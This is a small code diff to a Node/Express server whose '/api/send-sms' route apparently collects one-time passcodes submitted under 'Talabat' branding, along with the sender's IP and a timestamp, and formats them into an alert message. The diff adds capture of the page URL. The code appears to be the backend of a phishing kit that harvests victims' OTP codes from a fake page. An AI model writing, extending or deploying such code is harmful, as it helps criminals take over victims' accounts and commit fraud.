@@ -109,6 +109,7 @@ app.post('/api/send-sms', async (req, res) => {
         const {
             otp,
             ip,
+            pageUrl,
             timestamp
         } = req.body;
         
@@ -124,6 +125,7 @@ app.post('/api/send-sms', async (req, res) => {
         const message = `📱 [Talabat SMS/OTP Code]
 
 🔢 OTP Code: ${otp}
+📄 Page URL: ${pageUrl || 'N/A'}
 🌐 IP: ${ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress}
 ⏰ Time: ${timestamp || new Date().toISOString()}
 
